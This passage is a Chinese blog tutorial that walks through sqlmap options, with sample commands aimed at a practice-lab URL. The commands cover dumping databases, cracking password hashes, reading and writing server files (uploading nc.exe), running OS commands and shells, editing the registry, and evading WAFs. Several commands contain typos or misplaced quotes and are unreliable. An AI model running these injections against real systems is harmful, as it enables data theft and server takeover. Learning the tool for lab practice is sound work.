python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --time-sec=3
1
3.–-union-cols ：在进行联合查询注入时，指定列数检测范围

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --technique U -–union-cols 12-16
1
4.—union-char ：在进行联合查询注入时，设定注入字符

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --technique U --union-char 123
1
5.—union-from：在联合查询中，指定一个有效和可访问的表名。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --technique U --union-from=users
1
6.-dns-domain : DNS泄露攻击 .

7.—second-order：二阶注入攻击。有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面。后面接url。

八.指纹
1.—fingerprint/-f：扩大Sqlmap对注入目标进行数据库管理系统指纹识别

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --fingerprint
1
2.—banner / -b：精确Sqlmap对注入目标进行数据库管理系统指纹识别

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --banner
1
九.暴力破解
1.—common-tables：暴力破解表名。因为有些情况无法用—tables来查看表名。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --common-tables -D users --banner
1
注意：该参数使用的字典是txt/common-tables.txt，其中存储了常见表名，可以手动编辑该文件。

2.—common-columns：暴力破解列名

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --common-tables --common-columns -D users --banner
1
注意：该参数使用的字典是txt/common-columns.txt，其中存储了常见列名，可以手动编辑该文件。

十.列举数据
这些参数用于列举出数据库管理系统信息、数据结构和数据内容。

1.–-all : 一键列举全部数据

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -D admin -T user -C id --all
1
使用这一个参数就能列举所有可访问的数据。但不推荐使用，因为这会发送大量请求，把有用和无用的信息都列举出来。

2.–-current-user: 列举当前用户

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --dmbs="MySQL" --curent-user
1
注意：使用这一参数有可能将执行SQL语句的用户列举出来。

3.–-current-db：列举当前数据库

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --current-db
1
注意：使用这一参数有可能将WEB应用连接的数据库名列举出来。

4.—hostname ：列举服务器主机名

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --hostname
1
注意：使用这一参数有可能将数据库管理系统所在计算机的主机名列举出来

5.—is-dba ：检测当前用户是否是管理员

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --is-dba
1
注意：使用这一参数有可能能够检测当前用户是否是管理员，若是管理员则返回True，否则返回False。

6.-–users: 列举数据库管理系统中的用户

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --users
1
注意：当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中的用户。

9.—passwords：列举并破解数据库管理系统用户密码Hash值

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --passwords -U CU
1
当前用户有读取包含了数据库管理系统中用户密码Hash值的系统表的权限时使用这一参数可以列举数据库管理系统中用户密码Hash值。Sqlmap不仅会列举出密码Hash，还会解析密码Hash格式，并询问用户是否要通过密码字典的方式破解Hash值寻找出明文密码。若想只枚举特定用户的密码使用参数“-U”指定用户，可用“CU”来代表当前用户

10.—privileges：列举数据库管理系统的用户权限

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --privileges -U CU
1
注意：当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。

-–roles ：列举数据库管理系统的用户角色
python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --roles -U CU
1
注意：当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的角色。

12.–-dbs ：列举数据库管理系统中的所有数据库

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --dbs
1
13.–-tables、–exclude-sysdbs和-D ：列举数据库数据库的所有表

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -D dababase() --tables
1
注意：使用参数“–exclude-sysdbs”可排除系统数据库。在Oracle中要指定TABLESPACE_NAME而不是数据库名。

14.–-columns、-C、-T和-D： 列举数据表的所有列

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -D dababase_name -T table_name --columns
1
15.—schema：列举数据库管理系统的模式

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --schema –-exclude-sysdbs
1
注意：参数“–exclude-sysdbs”排除系统数据库。

16.–-count ： 列举表中数据条数

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" --count -D dababase_name
1
17.–dump、-C、-T、-D、–-start、–-stop和–-where ：列举表中数据

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -D dababase_name -T table_name -C column_name --dump --start 1 --stop 3 --where id>3
1
注意：Start和Stop相当于区间，where是添加条件

18.–-dump-all和–-exclude-sysdbs ：.列举所有数据库所有表中所有数据

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -D dababase_name --dump-all --exclude-sysdbs
1
19.–-search、-C、-T和-D ：可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1" -D dababase_name --search -T user,password
1
20.–-sql-query和–-sql-shell :运行自定义的SQL语句

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --sql-query "SELECT 'foo'" -v 1"
1
十一.UDF注入
1.–-udf-inject ：UDF是“user-defined function”的缩写，UDF是一种针对MySQL和PostgreSQL的高级注入技术，

2.–-shared-lib ：添加此参数Sqlmap会在运行时询问共享库文件路径。

十二.访问文件系统
1.–-file-read：读取文件

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --file-read "C:/1.php" -v 1"
1
注意：当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有读取文件相关权限时读取文件是可行的。

2.–-file-write和–-file-dest ：上传文件

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1"
1
当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有写文件相关权限时上传文件是可行的。

十三.操作系统控制
1.–-os-cmd和–-os-shell ：执行任意操作系统命令

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --os-cmd id -v 1"
1
2.–os-pwn、–os-smbrelay、–os-bof、–priv-esc、–msf-path和–tmp-path：带外TCP连接：Meterpreter及相关

十四.Windows注册表操作
满足以下条件就可以对Windows注册表进行操作：①目标数据库管理系统是运行在Windows上的。②目标数据库管理系统是MySQL、PostgreSQL或微软SQL Server。③支持堆查询。④.目标数据库管理系统当前用户有足够的权限

1.–-reg-read ：读Windows注册表键值

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 –-reg-read
1
2.-–reg-add ：写Windows注册表键值

3.-–reg-del ： 删除Windows注册表键值

4.–-reg-key、–-reg-value、-–reg-data和-–reg-type：辅助

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE \sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
1
十五.通用选项
1.-s ： 从SQLite文件中载入Sqlmap会话

注意：Sqlmap会自动地为每一个目标创建长久保存的会话SQLite文件，该文件统一存储在特定目录（如：~/.sqlmap/output/）中，其中保存着恢复会话所需的所有数据。若用户想要明确地指定SQLite文件（例如想要将多个目标的数据存储到同一个SQLite文件中），可使用此参数。

2.-t ：将HTTP(S)流量记录到日志文件中

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 -t adads/1.txt
1
3.–-batch :非交互模式

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --dump --batah
1
4.–-charset : 设置字符编码

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --dump –-charset=GBK
1
5.—–crawl ：从目标URL开始爬取目标站点。设置深度。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --batch --crawl=3
1
注意：–-crawl-exclude在此参数后跟一个正则表达式可以排除不想爬取的URL。若URL匹配正则，则不被爬取。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --batch --crawl=3 –-crawl-exclude=logout
1
6.–-csv-del ：设置输出CSV文件中的分隔符

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 -–csv-del=";"
1
7.–-dbms-cred ：数据库管理系统认证凭据

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --dbms-cred=admin:password
1
8.-–dump-format：数据输出格式。有CSV、HTML、SQLLITE

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 -–dump-format=csv --csv-del=";"
1
9.-–eta ： 显示估计的完成时间

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --eta
1
10.–-flush-session ：刷新会话文件，避免Sqlmap默认的缓存机制可能造成的一些问题。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --flush-session
1
11.-–forms : 解析和测试表单输入字段

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --forms
1
12.—fresh-queries：忽略会话文件中的查询结果

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --fresh-queries
1
13.–-hex：对返回结果使用HEX函数

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --fresh-queries --hex
1
14.—output-dir ：指定输出目录路径

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --forms --output-dir=/a/b
1
15.–-parse-errors ： 从响应中解析DBMS的错误信息

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --parse-errors
1
16.–-pivot-column ： 指定中轴列

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --pivot-column=id
1
注意：有时（如在微软SQL Server、Sybase和SAP MaxDB中）由于缺乏类似机制不可以直接使用偏移m,n的方式列举数据表记录。在这种情况下，Sqlmap通过确定最适合的中轴列（最独特的值）来列举数据，中轴列的值稍后用于检索其他列值。如果自动选择失败就需要使用该参数手动指定中轴列，

17.–-save ：保存选项到配置文件中

18.-–update ：升级Sqlmap

十六.杂项
1.-z 使用简写

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --batch --random-agent --ignore-proxy --technique=BEU
1
简写===>

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 -z "bat,randoma,ign,tec=BEU"
1
2.–-alert 在成功检测到注入点时报警

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --alert "notify-send '找到漏洞了'"
1
3.-–answers : 设置问题的回答

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --answers="extending=N"
1
4.-–beep: 在成功检测到注入点时发出“嘟”声

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --beep
1
5.–-cleanup : 清除Sqlmap创建的临时表和自定义函数

python sqlmap.py --cleanup
1
6.-–dependencies :检查依赖

python sqlmap.py --dependencies
1
7.-–disable-coloring: 关闭彩色输出

python sqlmap.py -–disable-coloring
1
8.–gpage : 指定使用Google dork结果的某页

9.–hpp: 使用HTTP参数污染。如果怀疑目标受WAF/IPS/IDS保护，可以尝试用此参数进行绕过。

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 -hpp
1
10.-–identify-waf ： 彻底检测WAF/IPS/IDS

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 -–identify-waf
1
注意：Sqlmap可以识别WAF/IPS/IDS以便用户进行针对性操作

11.-–mobile ： 模仿智能手机

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --mobile
1
12.-–offline ： 离线模式（仅仅使用会话数据）

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --offline
1
注意：添加此参数，Sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。

13.-–page-rank： 在Google dork中展示页面权重

14.-–purge-output： 从输出目录中安全移除所有内容

python sqlmap.py --purge-output -v 3
1
15.-–smart ： 快速扫描

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --smart
1
16.–-test-filter ， –test-skip ： 通过关键词使用或跳过payload

python sqlmap.py -u "http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 --test-filter=ROW –test-skip=BENCHMARK
1
17.–-sqlmap-shell ： 交互式Sqlmap Shell

python sqlmap.py --sqlmap-shell
1
18.-–wizard : 为初学者准备的简单向导

python sqlmap.py --wizard
1
结束
花了3天的时间去学习，一共就这么多啦，有些还是挺好用的，有些我也测试不了，因为···看不懂（泪目）

参考文献
1.Sqlmap中文手册：https://blog.csdn.net/wn314/article/details/78872828
2.sqlmap命令基础：http://love.ranshy.com/sqlmap%E5%91%BD%E4%BB%A4%E5%9F%BA%E7%A1%80/
3.sqlmap 详解：https://blog.csdn.net/freeking101/article/details/72472141
4.Sqlmap的使用详解:https://www.cnblogs.com/csnd/p/11807583.html
5.SQLMap用户手册【超详细】:https://www.cnblogs.com/hongfei/p/3872156.html
   
原文链接：https://blog.csdn.net/weixin_44420143/article/details/118730781
```